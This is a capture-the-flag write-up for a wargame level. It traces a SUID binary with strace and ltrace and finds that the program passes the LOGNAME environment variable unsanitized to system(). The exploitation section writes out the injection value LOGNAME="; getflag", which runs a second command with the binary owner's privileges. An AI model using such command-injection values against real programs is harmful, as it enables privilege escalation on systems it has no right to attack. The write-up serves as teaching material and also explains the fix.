# Level 07

## 1. Target Information
- **User:** `level07`
- **Password:** `***FLAG06***`
- **Target:** `flag07`
- **SSH Port:** `4242`

---

## 2. Reconnaissance & Discovery
Search for files owned by `flag07`:

```bash
find / -user flag07 2>/dev/null
ls -l
file level07
```

**Findings:**
- A SUID executable owned by `flag07`:
```text
-rwsr-x---+ 1 flag07 level07 ... level07
```
- The `s` bit means the program runs with `flag07`'s effective uid/gid.
- `strings ./level07` hints that the program reads the environment (an env-var reference such as `LOGNAME`, plus an `/bin/echo %s ` format string).

### Tracing the binary
`strace` shows the **system-call** side — the effects at the kernel boundary:
```bash
strace ./level07
```
```text
getegid32()                 = 2007
geteuid32()                 = 2007
setresgid32(2007, 2007, 2007) = 0
setresuid32(2007, 2007, 2007) = 0
...
clone(...)                  = 2043        # fork
waitpid(2043, [WIFEXITED...], 0) = 2043   # wait for child
```
The `setres*id(2007,...)` calls keep the `flag07` identity, and the `clone` + `waitpid` pair is the tell-tale signature of a `system()` call spawning `/bin/sh -c`. But `strace` never reveals **what command** is run or **where its input comes from** — that work happens entirely in userspace.

`ltrace` shows the **library-call** side and fills in that gap:
```bash
ltrace ./level07
```
```text
getenv("LOGNAME")           = ...
asprintf(..., "/bin/echo %s ", ...) = ...
system("/bin/echo  ")       = ...
```

- Key observation: the program reads the `LOGNAME` environment variable and concatenates it **unsanitized** into a shell command passed to `system()`. Reconstructed logic:
```c
setresgid(egid, egid, egid);
setresuid(euid, euid, euid);
asprintf(&buffer, "/bin/echo %s ", getenv("LOGNAME"));
system(buffer);
```

> **Why both tracers?** `strace` = "what the program asked the *kernel*" (saw the fork/exec effect, not the command). `ltrace` = "what the program asked *libc*" (`getenv` → `asprintf` → `system`). The injection is only visible at the library layer.

---

## 3. Vulnerability Analysis
- **Flaw Type:** Command injection via an unsanitized environment variable passed to `system()`.
- **Technical Explanation:**
  - `system(buffer)` runs `/bin/sh -c "<buffer>"`, so the shell parses `buffer` for metacharacters (`;`, `|`, `&`, `$()`, …).
  - `buffer` is built as `"/bin/echo " + $LOGNAME`, and `LOGNAME` is fully attacker-controlled — we set it in our own environment before running the binary.
  - Injecting a shell separator into `LOGNAME` lets us append a second command. With `LOGNAME="; getflag"`, `buffer` becomes:
    ```text
    /bin/echo ; getflag
    ```
    The `;` terminates the harmless `echo`, and `getflag` runs as a new command.
  - Because the binary is SUID `flag07` and keeps that identity via `setresuid`, the injected `getflag` executes **as `flag07`**, printing the token.
  - **Root cause / fix:** never build shell command strings from untrusted input. Use `execve`/`execl` with an argument vector (no shell parsing), and drop privileges fully before doing anything with user-controlled data.

---

## 4. Exploitation Walkthrough

### Step 1: Poison the `LOGNAME` environment variable
```bash
export LOGNAME="; getflag"
```

### Step 2: Run the SUID binary
```bash
~/level07
#  (blank line from the empty /bin/echo)
# Check flag.Here is your token : ***FLAG07***
```

The command executed under `system()` is `/bin/echo ; getflag`: the `echo` prints an empty line, then `getflag` runs as `flag07` and prints the token.

> Alternatively, pass the variable inline for a single run without exporting:
> ```bash
> LOGNAME="; getflag" ~/level07
> ```

---

## 5. Flag
```text
***FLAG07***
```
- **Next Level User:** `level08`
- **Password for next level:** `***FLAG07***`
